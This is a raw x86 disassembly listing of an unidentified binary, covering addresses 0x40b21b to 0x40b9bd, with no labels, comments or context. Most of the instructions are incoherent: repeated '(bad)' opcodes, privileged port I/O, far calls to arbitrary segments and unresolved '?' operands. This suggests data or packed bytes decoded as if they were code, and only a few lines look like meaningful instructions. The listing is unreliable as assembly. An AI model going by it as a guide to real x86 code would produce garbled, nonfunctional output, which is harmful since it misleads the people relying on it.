  40b21b:	dec    esi
  40b21c:	jnp    0x40b1db
  40b21e:	(bad)  
  40b21f:	adc    BYTE PTR [ecx-0x26],cl
  40b222:	retf   0xdf68
  40b225:	cmp    ebp,DWORD PTR [ebx+0x3c5fc4d0]
  40b22b:	or     al,0xca
  40b22d:	cmp    eax,0x33db588c
  40b232:	push   edi
  40b233:	(bad)  
  40b234:	cld    
  40b235:	sbb    ecx,DWORD PTR [edi-0x1fa25994]
  40b23b:	int3   
  40b23c:	fadd   QWORD PTR [ecx+0x52dd3834]
  40b242:	imul   ebp,esp,0xa
  40b245:	push   ds
  40b246:	das    
  40b247:	push   ebp
  40b248:	fxch   st(5)
  40b24a:	(bad)  
  40b24c:	fild   WORD PTR [ecx]
  40b24e:	jb     0x40b27d
  40b250:	xchg   ecx,eax
  40b251:	ins    BYTE PTR es:[edi],dx
  40b252:	shr    DWORD PTR [ebp+0x66],1
  40b255:	call   0x6a3b:0x186c4159
  40b25c:	jnp    0x40b208
  40b25e:	dec    eax
  40b25f:	test   BYTE PTR [ebp-0x2e831700],bl
  40b265:	ins    BYTE PTR es:[edi],dx
  40b266:	stos   DWORD PTR es:[edi],eax
  40b267:	dec    ebx
  40b268:	mov    al,0x53
  40b26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b26b:	leave  
  40b26c:	lea    eax,[ebx]
  40b26e:	push   eax
  40b26f:	xchg   edi,eax
  40b270:	adc    DWORD PTR [eax],ebx
  40b272:	in     eax,0x7c
  40b274:	jno    0x40b227
  40b276:	repnz or DWORD PTR [ecx+0x1c],edi
  40b27a:	cld    
  40b27b:	into   
  40b27c:	(bad)  [ecx+0x21]
  40b27f:	inc    esp
  40b280:	xchg   ecx,eax
  40b281:	out    0x3b,al
  40b283:	adc    edi,DWORD PTR [eax]
  40b285:	or     eax,0x64f8ce2
  40b28a:	pop    edx
  40b28b:	addr16 cmp al,0x5d
  40b28e:	mov    eax,0xe632bbb
  40b293:	xchg   DWORD PTR [ebp+0x10307f55],edx
  40b299:	adc    al,0xf5
  40b29b:	nop
  40b29c:	inc    esi
  40b29d:	add    eax,0x2c588eac
  40b2a2:	(bad)  
  40b2a3:	jns    0x40b2b9
  40b2a5:	mov    esi,0xe6fd95bf
  40b2aa:	in     eax,dx
  40b2ab:	inc    ebp
  40b2ac:	inc    esp
  40b2ad:	(bad)  
  40b2ae:	ret    0xceea
  40b2b1:	pop    es
  40b2b2:	daa    
  40b2b3:	inc    esi
  40b2b4:	nop
  40b2b5:	call   0x35c0:0x2faff7e5
  40b2bc:	mov    edx,DWORD PTR ds:[esi+ebx*1]
  40b2c0:	sti    
  40b2c1:	mov    eax,0x19a82288
  40b2c6:	xlat   BYTE PTR ds:[ebx]
  40b2c7:	jg     0x40b33b
  40b2c9:	sti    
  40b2ca:	shr    esp,cl
  40b2cc:	popa   
  40b2cd:	cmc    
  40b2ce:	mov    cl,0xc
  40b2d0:	xor    eax,edi
  40b2d2:	xor    edx,edx
  40b2d4:	or     eax,edx
  40b2d6:	lea    eax,[ebp+eax*1-0x4]
  40b2da:	jmp    0x40b864
  40b2df:	dec    esp
  40b2e0:	outs   dx,DWORD PTR ds:[esi]
  40b2e1:	cdq    
  40b2e2:	js     0x40b27c
  40b2e4:	cmp    BYTE PTR [ebx+edx*1],ch
  40b2e7:	mov    ah,0x21
  40b2e9:	mov    al,0xae
  40b2eb:	xchg   edx,eax
  40b2ec:	js     0x40b2e9
  40b2ee:	mov    ah,0xba
  40b2f0:	call   DWORD PTR [esi]
  40b2f2:	push   ss
  40b2f3:	cmp    eax,0x49161604
  40b2f8:	(bad)  
  40b2f9:	je     0x40b2e0
  40b2fb:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2fd:	arpl   WORD PTR [edi-0x6b54651b],ax
  40b303:	mov    ds,WORD PTR [ebp+0x605551e3]
  40b309:	call   0x5cf1:0xafafc700
  40b310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b312:	dec    ebp
  40b313:	cmc    
  40b314:	sub    eax,0x9b1e8ef
  40b319:	ffreep st(5)
  40b31b:	loope  0x40b2d2
  40b31d:	jb     0x40b38d
  40b31f:	mov    ch,0xb8
  40b321:	lock jb 0x40b2d3
  40b324:	xor    ah,BYTE PTR [esi-0x326629c3]
  40b32a:	out    dx,eax
  40b32b:	ror    DWORD PTR [ebp-0x6f631afc],0xbb
  40b332:	stos   DWORD PTR es:[edi],eax
  40b333:	adc    eax,0xa25125be
  40b338:	cld    
  40b339:	jo     0x40b320
  40b33b:	jmp    0x40b34b
  40b33d:	mov    al,ds:0x18f86790
  40b342:	jb     0x40b332
  40b344:	cmp    eax,0xfa91a089
  40b349:	xchg   ecx,eax
  40b34a:	out    0x48,eax
  40b34c:	cmp    ah,BYTE PTR [ebx+edi*8+0x72]
  40b350:	jnp    0x40b33a
  40b352:	jne    0x40b3bb
  40b354:	shl    BYTE PTR [eax+ecx*2+0x7c],cl
  40b358:	gs hlt 
  40b35a:	idiv   BYTE PTR [esp+eiz*4-0x675d3b70]
  40b361:	pop    edi
  40b362:	imul   ebp,ebx,0x397a41fc
  40b368:	add    eax,edx
  40b36a:	cmp    DWORD PTR [edi-0x63],ebp
  40b36d:	mov    esi,0x68aa5ef
  40b372:	loopne 0x40b34d
  40b374:	pushf  
  40b375:	int3   
  40b376:	lods   al,BYTE PTR ds:[esi]
  40b377:	xchg   esi,eax
  40b378:	jecxz  0x40b322
  40b37a:	call   0x7d94a56b
  40b37f:	push   eax
  40b380:	mov    bl,0xcf
  40b382:	fdivr  QWORD PTR [edx-0x44]
  40b385:	aas    
  40b386:	and    dh,ah
  40b388:	xor    cl,dh
  40b38a:	pushf  
  40b38b:	clc    
  40b38c:	leave  
  40b38d:	xor    al,0x26
  40b38f:	jmp    0xa60:0x6aacdd57
  40b396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b397:	jg     0x40b33b
  40b399:	ins    DWORD PTR es:[edi],dx
  40b39a:	xchg   esi,eax
  40b39b:	(bad)  
  40b39c:	and    BYTE PTR [ecx+ebp*1],ch
  40b39f:	in     al,0xf7
  40b3a1:	sti    
  40b3a2:	cmp    BYTE PTR [edx-0x424e94d4],dl
  40b3a8:	ins    DWORD PTR es:[edi],dx
  40b3a9:	(bad)  
  40b3aa:	cli    
  40b3ab:	imul   edi,DWORD PTR [esi],0x5b9712c0
  40b3b1:	mov    eax,ds:0xb3d208db
  40b3b6:	xchg   edx,eax
  40b3b7:	add    DWORD PTR ds:0x2b346002,0xffffffa8
  40b3be:	xor    eax,0xbe4e7246
  40b3c3:	es addr16 jmp 0x40b34b
  40b3c7:	pop    ebx
  40b3c8:	inc    esp
  40b3c9:	mov    bl,0xb3
  40b3cb:	(bad)  
  40b3cc:	rcl    edi,1
  40b3ce:	iret   
  40b3cf:	(bad)  
  40b3d0:	sbb    esi,DWORD PTR [ecx+eiz*1+0x26f09364]
  40b3d7:	stos   BYTE PTR es:[edi],al
  40b3d8:	test   DWORD PTR [ebx+0x3a],ebp
  40b3db:	cwde   
  40b3dc:	pop    es
  40b3dd:	clc    
  40b3de:	cli    
  40b3df:	js     0x40b381
  40b3e1:	jge    0x40b382
  40b3e3:	mov    esi,0x3a391741
  40b3e8:	rol    esp,0x4f
  40b3eb:	xor    ah,BYTE PTR [edi]
  40b3ed:	addr16 dec ecx
  40b3ef:	stos   BYTE PTR es:[edi],al
  40b3f0:	mov    ch,ch
  40b3f2:	call   FWORD PTR [edx-0x4fa8f532]
  40b3f8:	stos   BYTE PTR es:[edi],al
  40b3f9:	aad    0x10
  40b3fb:	into   
  40b3fc:	leave  
  40b3fd:	inc    ebx
  40b3fe:	push   ss
  40b3ff:	iret   
  40b400:	mov    al,0x0
  40b402:	lods   al,BYTE PTR ds:[esi]
  40b403:	push   eax
  40b404:	mov    ds:0xe2f73681,eax
  40b409:	jp     0x40b401
  40b40b:	sbb    al,0x24
  40b40d:	jmp    0x40b453
  40b40f:	jecxz  0x40b47e
  40b411:	pop    ss
  40b412:	cwde   
  40b413:	out    dx,al
  40b414:	popa   
  40b415:	adc    BYTE PTR ds:0x3e524264,dl
  40b41b:	lea    ebx,[edi-0x2a3db843]
  40b421:	call   0x435f:0x582e2b36
  40b428:	fldcw  WORD PTR [ecx]
  40b42a:	cmp    BYTE PTR [esi-0x9],dl
  40b42d:	pop    edx
  40b42e:	call   0x39dd6d0c
  40b433:	adc    al,0x44
  40b435:	adc    ah,al
  40b437:	mov    BYTE PTR [ebx+edx*8],bh
  40b43a:	mov    ?,eax
  40b43c:	mov    ds:0xebbe4d82,al
  40b441:	jb     0x40b3d9
  40b443:	fcomip st,st(7)
  40b445:	inc    ebx
  40b446:	sub    al,0x21
  40b448:	jl     0x40b425
  40b44a:	adc    al,0x23
  40b44c:	mov    ecx,?
  40b44e:	cs add ch,dl
  40b451:	cvtps2pi mm5,QWORD PTR [esi+0x34]
  40b455:	or     ch,BYTE PTR [ebx+0x3484aed4]
  40b45b:	lods   al,BYTE PTR ds:[esi]
  40b45c:	fwait
  40b45d:	pop    ds
  40b45e:	pop    edx
  40b45f:	jnp    0x40b497
  40b461:	mov    edi,0x3e0c328e
  40b466:	jnp    0x40b465
  40b468:	jp     0x40b4ae
  40b46a:	stos   BYTE PTR es:[edi],al
  40b46b:	cld    
  40b46c:	mov    edx,0x94287dc2
  40b471:	mov    ah,0x70
  40b473:	retf   0x6110
  40b476:	bound  ebp,QWORD PTR [edx]
  40b478:	mov    ds,WORD PTR [ebp+0x1fddddf4]
  40b47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b47f:	mov    ?,WORD PTR [ebp+edi*4-0x180e8de2]
  40b486:	pop    edx
  40b487:	sbb    DWORD PTR [edi+0x40],ecx
  40b48a:	xchg   DWORD PTR [esi],esi
  40b48c:	sbb    ebx,DWORD PTR [edx+esi*4-0x45]
  40b490:	dec    eax
  40b491:	dec    ecx
  40b492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b493:	(bad)  
  40b494:	(bad)  
  40b495:	fldenv [ebx-0x734caf73]
  40b49b:	sbb    BYTE PTR [edi],ch
  40b49d:	or     ebp,DWORD PTR [eax]
  40b49f:	sub    DWORD PTR [ebx],0xffffffbd
  40b4a2:	in     al,0xd1
  40b4a4:	inc    eax
  40b4a5:	and    BYTE PTR [ecx-0x63aaf098],ah
  40b4ab:	pop    ebx
  40b4ac:	sti    
  40b4ad:	cwde   
  40b4ae:	dec    ecx
  40b4af:	mov    cs:0xfe4be9d5,al
  40b4b5:	sahf   
  40b4b6:	adc    esp,DWORD PTR [edi+esi*1]
  40b4b9:	pop    es
  40b4ba:	test   DWORD PTR [edx],0xb3945724
  40b4c0:	ror    cl,1
  40b4c2:	pushf  
  40b4c3:	or     DWORD PTR [eax+0x6b],0xe
  40b4c7:	cdq    
  40b4c8:	and    BYTE PTR [eax],dl
  40b4ca:	jmp    0xb3525d3e
  40b4cf:	icebp  
  40b4d0:	mov    eax,esp
  40b4d2:	jp     0x40b4b5
  40b4d4:	jno    0x40b482
  40b4d6:	and    DWORD PTR [esp+ebp*1+0x505939aa],ecx
  40b4dd:	or     BYTE PTR [ecx+0x71],bl
  40b4e0:	push   0x20
  40b4e2:	pop    ss
  40b4e3:	sbb    BYTE PTR [ecx+0x17e7e60f],0x3
  40b4ea:	repnz imul esi,DWORD PTR [eax],0x58
  40b4ee:	cwde   
  40b4ef:	xchg   edx,eax
  40b4f0:	outs   dx,BYTE PTR ds:[esi]
  40b4f1:	in     al,dx
  40b4f2:	xchg   esi,eax
  40b4f3:	sti    
  40b4f4:	les    eax,FWORD PTR [eax+0x6f]
  40b4f7:	in     al,dx
  40b4f8:	outs   dx,BYTE PTR ds:[esi]
  40b4f9:	lods   al,BYTE PTR ds:[esi]
  40b4fa:	or     BYTE PTR [esi+0x566d6caa],ah
  40b500:	out    dx,eax
  40b501:	cmp    ah,al
  40b503:	mov    dh,bl
  40b505:	pop    es
  40b506:	aad    0x51
  40b508:	sub    eax,0xe8ff5536
  40b50d:	les    eax,FWORD PTR [ebx-0x7b]
  40b510:	xchg   esp,eax
  40b511:	push   esi
  40b512:	aas    
  40b513:	mov    es,WORD PTR [ebp+ebx*1-0x3f]
  40b517:	push   edx
  40b518:	int    0xe
  40b51a:	fs dec esi
  40b51c:	jae    0x40b55f
  40b51e:	jb     0x40b4fb
  40b520:	mov    al,0x22
  40b522:	push   0x741aad9b
  40b527:	rcr    DWORD PTR [esi+0x45fc26d],cl
  40b52d:	repnz daa 
  40b52f:	es inc esi
  40b531:	xchg   ebp,eax
  40b532:	add    esi,edx
  40b534:	inc    eax
  40b535:	or     DWORD PTR [esi-0x6b9fc38b],edi
  40b53b:	ret    0x8294
  40b53e:	call   0x3d9ee934
  40b543:	shl    DWORD PTR gs:[edx+eax*8-0x588154bc],cl
  40b54b:	pop    ebp
  40b54c:	out    dx,eax
  40b54d:	inc    ah
  40b54f:	(bad)  [ecx+0x69]
  40b552:	leave  
  40b553:	pop    ebp
  40b554:	adc    eax,0x2a2c0c4
  40b559:	sub    bh,dh
  40b55b:	ds movaps xmm6,xmm4
  40b55f:	retf   
  40b560:	into   
  40b561:	rcl    BYTE PTR [esp-0x5d],1
  40b565:	pusha  
  40b566:	ss popa 
  40b568:	xchg   ecx,eax
  40b569:	cld    
  40b56a:	add    DWORD PTR [esi],0x12
  40b56d:	mov    ds:0xc5ccabe8,eax
  40b572:	test   ebx,0xe03e7c71
  40b578:	aas    
  40b579:	dec    ecx
  40b57a:	fld    TBYTE PTR [edx+ecx*8]
  40b57d:	xor    dh,ah
  40b57f:	retf   0x7099
  40b582:	xor    BYTE PTR [eax+0x2d],ch
  40b585:	daa    
  40b586:	and    cl,BYTE PTR [ebx-0x4595fd8d]
  40b58c:	jecxz  0x40b512
  40b58e:	push   ecx
  40b58f:	imul   edx,DWORD PTR ds:0xf95f90d,0xf2f1573b
  40b599:	jmp    0x97ae3bbe
  40b59e:	pop    ss
  40b59f:	lock cmp dh,BYTE PTR [eax-0x202bb7a9]
  40b5a6:	nop
  40b5a7:	addr16 adc ah,bh
  40b5aa:	xor    bh,BYTE PTR [edx-0x577bf7e0]
  40b5b0:	sbb    BYTE PTR ds:0x7b65e9cd,al
  40b5b6:	out    0xe5,eax
  40b5b8:	dec    ecx
  40b5b9:	je     0x40b54b
  40b5bb:	inc    esp
  40b5bc:	daa    
  40b5bd:	cmp    al,0xf6
  40b5bf:	pop    edi
  40b5c0:	pusha  
  40b5c1:	mov    bl,0xf7
  40b5c3:	inc    edi
  40b5c4:	lds    ebp,FWORD PTR [ecx-0x74]
  40b5c7:	cmp    eax,DWORD PTR [ebx]
  40b5c9:	jae    0x40b5fd
  40b5cb:	or     ah,al
  40b5cd:	adc    ch,ah
  40b5cf:	iret   
  40b5d0:	add    dh,BYTE PTR [edi-0x3aef9341]
  40b5d6:	dec    ebx
  40b5d7:	xor    al,0xe0
  40b5d9:	mov    ds:0x5741a74b,eax
  40b5de:	scas   eax,DWORD PTR es:[edi]
  40b5df:	rcr    DWORD PTR [ebp-0x2f0cac62],cl
  40b5e5:	es fs dec esi
  40b5e8:	popa   
  40b5e9:	adc    ebp,DWORD PTR [ecx+0x217d08f2]
  40b5ef:	out    0xc3,al
  40b5f1:	sbb    eax,DWORD PTR [esi]
  40b5f3:	or     DWORD PTR [edi],ebx
  40b5f5:	in     al,dx
  40b5f6:	(bad)
  40b5f9:	cmp    cl,ah
  40b5fb:	inc    edi
  40b5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5fe:	mov    si,0x8c65
  40b602:	out    0xf6,eax
  40b604:	jbe    0x40b639
  40b606:	aad    0xac
  40b608:	xor    ah,BYTE PTR [edx+0x2f24bf48]
  40b60e:	call   0x7c59d3d2
  40b613:	out    0xf4,eax
  40b615:	mov    eax,ds:0x6710bb36
  40b61a:	movdqu XMMWORD PTR [edx+0x52fe0ab2],xmm7
  40b622:	xor    DWORD PTR [esi],ebx
  40b624:	in     eax,0x18
  40b626:	out    0xbc,eax
  40b628:	xchg   esp,eax
  40b629:	addr16 jno 0x40b60f
  40b62c:	push   cs
  40b62d:	popf   
  40b62e:	lock scas eax,DWORD PTR es:[edi]
  40b630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b631:	xchg   ebx,eax
  40b632:	xchg   edi,eax
  40b633:	icebp  
  40b634:	cmp    eax,0x6d3cacd6
  40b639:	sbb    cl,al
  40b63b:	nop
  40b63c:	pop    es
  40b63d:	pop    ecx
  40b63e:	cmc    
  40b63f:	jae    0x40b60d
  40b641:	and    esi,DWORD PTR ds:0xa56d4a4c
  40b647:	fwait
  40b648:	mov    ecx,0xb0d1f279
  40b64d:	ret    
  40b64e:	stc    
  40b64f:	ins    BYTE PTR es:[edi],dx
  40b650:	ins    BYTE PTR es:[edi],dx
  40b651:	call   0x7085bf38
  40b656:	add    al,dl
  40b658:	pop    edx
  40b659:	stos   DWORD PTR es:[edi],eax
  40b65a:	xchg   edx,eax
  40b65b:	cdq    
  40b65c:	aas    
  40b65d:	xchg   DWORD PTR [eax],ecx
  40b65f:	xchg   ebp,eax
  40b660:	push   esi
  40b661:	cmp    esp,esi
  40b663:	out    dx,eax
  40b664:	lea    edx,[ebx+edx*4+0x2b]
  40b668:	dec    ebx
  40b669:	(bad)  
  40b66a:	ret    
  40b66b:	mov    ah,0xbb
  40b66d:	lods   eax,DWORD PTR ds:[esi]
  40b66e:	adc    DWORD PTR [ecx-0x11],0x116869d7
  40b675:	push   esi
  40b676:	mov    ecx,0x7a15837f
  40b67b:	push   ebp
  40b67c:	adc    edx,DWORD PTR [esi+0x290a5ac3]
  40b682:	mov    al,ds:0xb60ead5c
  40b687:	push   eax
  40b688:	retf   
  40b689:	ret    
  40b68a:	sub    eax,0xe4cb8715
  40b68f:	add    edi,DWORD PTR [esi]
  40b691:	mov    esi,0x7fc83a8a
  40b696:	mov    dl,0xe6
  40b698:	and    BYTE PTR [edi],0xe5
  40b69b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69d:	enter  0x185c,0xc2
  40b6a1:	dec    edi
  40b6a2:	pop    ecx
  40b6a3:	test   al,0x2d
  40b6a5:	pop    ds
  40b6a6:	push   ebx
  40b6a7:	ins    DWORD PTR es:[edi],dx
  40b6a8:	popf   
  40b6a9:	out    dx,al
  40b6aa:	pusha  
  40b6ab:	or     esi,DWORD PTR [eax+ebp*2-0x53e3a0ce]
  40b6b2:	iret   
  40b6b3:	jmp    0x40b69d
  40b6b5:	dec    eax
  40b6b6:	leave  
  40b6b7:	pop    ss
  40b6b8:	mov    dl,0xee
  40b6ba:	xchg   ebp,eax
  40b6bb:	add    eax,0xe3c722f7
  40b6c0:	ins    DWORD PTR es:[edi],dx
  40b6c1:	ds xchg ebx,eax
  40b6c3:	call   edx
  40b6c5:	bound  ebp,QWORD PTR [ebp-0x18]
  40b6c8:	pop    bx
  40b6ca:	cmp    BYTE PTR [esi-0x7ba29db6],ch
  40b6d0:	mov    ah,0xdc
  40b6d2:	jnp    0x40b6d5
  40b6d4:	dec    esp
  40b6d5:	(bad)  
  40b6d7:	repnz fdiv QWORD PTR [edi+0x7dccb3c6]
  40b6de:	popf   
  40b6df:	adc    DWORD PTR ds:[esi+0x14],ecx
  40b6e3:	mov    dh,al
  40b6e5:	jmp    0x7272e73c
  40b6ea:	outs   dx,DWORD PTR ds:[esi]
  40b6eb:	sbb    eax,0xf65034cf
  40b6f0:	fwait
  40b6f1:	out    dx,eax
  40b6f2:	sub    DWORD PTR [ebp+0x66],0x48
  40b6f6:	jmp    0xce1f:0xa43c6685
  40b6fd:	jb     0x40b6cc
  40b6ff:	(bad)  
  40b700:	mov    esi,0x585250d6
  40b705:	jne    0x40b721
  40b707:	imul   esp,DWORD PTR [ebx-0x11004388],0x19a5e47e
  40b711:	pushf  
  40b712:	(bad)  
  40b713:	std    
  40b714:	rcl    BYTE PTR [ebp+0x19cb499a],0xcf
  40b71b:	aad    0xe
  40b71d:	repz sbb BYTE PTR [esi],ah
  40b720:	cmp    esi,DWORD PTR [ebx-0x3a]
  40b723:	cld    
  40b724:	xchg   edx,eax
  40b725:	push   ecx
  40b726:	mov    eax,0xaad13ddc
  40b72b:	or     dh,dh
  40b72d:	xchg   BYTE PTR [ecx],bl
  40b72f:	retf   
  40b730:	loope  0x40b7b1
  40b732:	mov    ebp,DWORD PTR [esi+0x3a4fbfec]
  40b738:	push   ecx
  40b739:	fnsave [edi-0x5]
  40b73c:	jno    0x40b6cb
  40b73e:	dec    edx
  40b73f:	mov    ds:0xa217f33f,al
  40b744:	ret    0xe314
  40b747:	enter  0x1a53,0x7b
  40b74b:	repnz cmp al,0x9d
  40b74e:	in     al,0xd9
  40b750:	loopne 0x40b6f7
  40b752:	push   eax
  40b753:	lods   al,BYTE PTR ds:[esi]
  40b754:	leave  
  40b755:	sbb    eax,0x8bc5610d
  40b75a:	xor    ah,BYTE PTR [esi+0x39]
  40b75d:	and    BYTE PTR [edx-0x7f0806c],al
  40b763:	icebp  
  40b764:	ins    BYTE PTR es:[edi],dx
  40b765:	sub    ebp,DWORD PTR [edi+0x34790c7b]
  40b76b:	mov    ebx,0x65c6eb55
  40b770:	(bad)  
  40b771:	jbe    0x40b7b7
  40b773:	mov    cs,WORD PTR [ecx+0x1f6e7992]
  40b779:	sbb    DWORD PTR [ebx+eiz*1],ecx
  40b77c:	stos   DWORD PTR es:[edi],eax
  40b77d:	pusha  
  40b77e:	mov    ds:0x2c1f5781,al
  40b783:	test   eax,edx
  40b785:	mov    DWORD PTR [esi+0x447b8f60],ecx
  40b78b:	push   edi
  40b78c:	adc    al,0x20
  40b78e:	push   0xffffffc4
  40b790:	imul   edx,DWORD PTR [ecx],0xffffff93
  40b793:	mov    ds:0xb7f7de1e,al
  40b798:	sahf   
  40b799:	cmp    DWORD PTR [eax],0xf0937767
  40b79f:	ds jbe 0x40b7f3
  40b7a2:	in     eax,dx
  40b7a3:	in     eax,dx
  40b7a4:	fdivr  QWORD PTR [ecx-0x6d]
  40b7a7:	push   ebx
  40b7a8:	div    BYTE PTR [eax]
  40b7aa:	ins    DWORD PTR es:[edi],dx
  40b7ab:	mov    ebx,0xed7c6657
  40b7b0:	mov    dl,0xec
  40b7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7b3:	int3   
  40b7b4:	or     eax,0x925e85cd
  40b7b9:	and    eax,esp
  40b7bb:	mov    eax,0xb343b2c
  40b7c0:	cs leave 
  40b7c2:	sub    bh,BYTE PTR [eax+0x362a59ea]
  40b7c8:	jecxz  0x40b797
  40b7ca:	fcom   st(5)
  40b7cc:	in     al,0x4e
  40b7ce:	aam    0x92
  40b7d0:	sub    DWORD PTR [ebp-0x3a0a30ad],0x1e764635
  40b7da:	(bad)  
  40b7db:	lahf   
  40b7dc:	and    DWORD PTR [ebp+0x3385b2d],0xc
  40b7e3:	push   edi
  40b7e4:	out    dx,al
  40b7e5:	out    dx,al
  40b7e6:	add    eax,0xad2f9bf7
  40b7eb:	mov    eax,ds:0x58f63b35
  40b7f0:	loope  0x40b7e6
  40b7f2:	xchg   ebx,eax
  40b7f3:	xchg   ecx,eax
  40b7f4:	and    al,ch
  40b7f6:	call   0xc3993024
  40b7fb:	stos   BYTE PTR es:[edi],al
  40b7fc:	add    al,0x5c
  40b7fe:	push   ebp
  40b7ff:	mov    gs:0x99328141,al
  40b805:	add    ah,BYTE PTR [edx]
  40b807:	adc    BYTE PTR [ebx-0x52],ah
  40b80a:	xor    DWORD PTR [eax+0x2df75cc7],eax
  40b810:	sbb    BYTE PTR [eax],ch
  40b812:	gs mov edi,0x85e92e5c
  40b818:	je     0x40b875
  40b81a:	loop   0x40b840
  40b81c:	push   ebx
  40b81d:	mov    ah,0xc7
  40b81f:	jecxz  0x40b7c4
  40b821:	lea    edi,[ecx+0x3723cd49]
  40b827:	int    0xa6
  40b829:	sbb    ebp,DWORD PTR [ebx+0x6b11813e]
  40b82f:	scas   al,BYTE PTR es:[edi]
  40b830:	iret   
  40b831:	mov    dh,0x7b
  40b833:	cdq    
  40b834:	cmp    al,0x2f
  40b836:	dec    ecx
  40b837:	adc    DWORD PTR [edi+edi*8+0x31f2dcce],ecx
  40b83e:	and    dh,BYTE PTR [esi+0x20]
  40b841:	push   ebx
  40b842:	fisubr WORD PTR [edi-0x26]
  40b845:	push   ebx
  40b846:	in     al,dx
  40b847:	adc    esi,DWORD PTR ss:[ecx+0x3d]
  40b84b:	lahf   
  40b84c:	scas   al,BYTE PTR es:[edi]
  40b84d:	adc    bl,BYTE PTR [ebx+edi*8-0x21ddf725]
  40b854:	jb     0x40b8ba
  40b856:	jmp    0xbdb11c1f
  40b85b:	inc    edi
  40b85c:	int    0xd5
  40b85e:	sbb    eax,DWORD PTR [ebp-0x44791385]
  40b864:	mov    DWORD PTR [ebp-0x34],eax
  40b867:	mov    eax,DWORD PTR [ebp-0x60]
  40b86a:	shl    ecx,0x1e
  40b86d:	mov    ecx,DWORD PTR [ebp-0x5c]
  40b870:	jmp    0x40bdfa
  40b875:	retf   
  40b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b877:	cli    
  40b878:	jo     0x40b852
  40b87a:	sbb    BYTE PTR [eax],ah
  40b87c:	and    al,0xe8
  40b87e:	ins    BYTE PTR es:[edi],dx
  40b87f:	mov    ah,0x72
  40b881:	inc    ecx
  40b882:	mov    ds:0xebf068e2,al
  40b887:	push   ss
  40b888:	push   ss
  40b889:	cmp    eax,0xab161604
  40b88e:	mov    DWORD PTR [esi+0x12c814],ebx
  40b894:	and    DWORD PTR ds:0xdc60cb8d,eax
  40b89a:	ror    BYTE PTR es:[eax+0x3826c636],cl
  40b8a1:	clc    
  40b8a2:	xchg   edx,eax
  40b8a3:	call   0x4119890b
  40b8a8:	adc    al,0x41
  40b8aa:	dec    esp
  40b8ab:	js     0x40b85f
  40b8ad:	gs mov ebx,0xf5e2ba4c
  40b8b3:	jge    0x40b8a6
  40b8b5:	jmp    0x45f01395
  40b8ba:	adc    eax,0xec7401a5
  40b8bf:	pop    esi
  40b8c0:	jne    0x40b90b
  40b8c2:	mov    bh,0xe1
  40b8c4:	lds    esp,FWORD PTR [edi-0x80]
  40b8c7:	inc    esi
  40b8c8:	fwait
  40b8c9:	mov    ds:0x5b9d8ad,eax
  40b8ce:	in     al,0xcc
  40b8d0:	jo     0x40b8a0
  40b8d2:	fisttp QWORD PTR [edi-0x80]
  40b8d5:	mov    dl,0x48
  40b8d7:	push   edx
  40b8d8:	and    al,BYTE PTR [eax+0x4b170730]
  40b8de:	cmp    esp,ecx
  40b8e0:	mov    esi,0x4ff8edac
  40b8e5:	cmc    
  40b8e6:	mov    ds,WORD PTR [edi+ebx*1+0x2f]
  40b8ea:	pop    ecx
  40b8eb:	sbb    eax,0xb132a622
  40b8f0:	mov    ds:0xc4ec1498,eax
  40b8f5:	shl    DWORD PTR [ecx+edx*4],cl
  40b8f8:	arpl   WORD PTR gs:[ebx],ax
  40b8fb:	popf   
  40b8fc:	cmp    eax,0x2c42ddc2
  40b901:	shl    BYTE PTR [edx],cl
  40b903:	xchg   BYTE PTR [ecx],al
  40b905:	mov    ebp,ebx
  40b907:	leave  
  40b908:	ret    0x42a0
  40b90b:	shl    DWORD PTR [ebp-0x2273917e],0x81
  40b912:	push   ebp
  40b913:	xchg   edx,eax
  40b914:	cs iret 
  40b916:	ror    DWORD PTR [edx+0x4d4dde02],1
  40b91c:	pop    ss
  40b91d:	hlt    
  40b91e:	sub    ax,0x770f
  40b922:	mov    ebp,0x955bb458
  40b927:	pushf  
  40b928:	call   0x29f74826
  40b92d:	sub    ch,bl
  40b92f:	imul   edi,edx,0xdeb85281
  40b935:	das    
  40b936:	add    ch,BYTE PTR [ecx+0x3f03542]
  40b93c:	in     al,0x73
  40b93e:	jge    0x40b968
  40b940:	mov    dl,0x3b
  40b942:	inc    eax
  40b943:	jno    0x40b913
  40b945:	into   
  40b946:	stc    
  40b947:	mov    dh,0x63
  40b949:	bound  esp,QWORD PTR [esi-0x7a653b41]
  40b94f:	adc    eax,0x62d637e3
  40b954:	fwait
  40b955:	sub    DWORD PTR [ebp+0x58f50de7],ebp
  40b95b:	das    
  40b95c:	mov    al,ds:0xaddfacb7
  40b961:	xchg   ecx,eax
  40b962:	mov    eax,0x8c6b0a8e
  40b967:	xchg   esp,eax
  40b968:	rcl    DWORD PTR [edi],1
  40b96a:	inc    ebp
  40b96b:	mov    al,ds:0xfad8cc2d
  40b970:	jmp    0xb7c6f264
  40b975:	jno    0x40b938
  40b977:	out    dx,eax
  40b978:	(bad)
  40b97b:	and    al,0xd0
  40b97d:	mov    eax,ds:0x9a6d6e07
  40b982:	in     al,dx
  40b983:	push   cs
  40b984:	mov    ds:0xd670e27f,al
  40b989:	fldenv [eax-0x546d56dc]
  40b98f:	mov    WORD PTR [eax+0x21],?
  40b992:	call   0x212e:0x83efd1ef
  40b999:	repz sahf 
  40b99b:	and    eax,0x9f285606
  40b9a0:	pusha  
  40b9a1:	sub    bl,0xe1
  40b9a4:	lds    esi,FWORD PTR [ecx+0x47]
  40b9a7:	dec    ecx
  40b9a8:	test   DWORD PTR [edx-0x47],eax
  40b9ab:	test   DWORD PTR [ebx+0x495a2a4],edi
  40b9b1:	clc    
  40b9b2:	and    al,0xfb
  40b9b4:	cmp    al,0x1e
  40b9b6:	aam    0xfe
  40b9b8:	out    dx,eax
  40b9b9:	push   edx
  40b9ba:	bnd jno 0x40b984
  40b9bd:	pop    esi
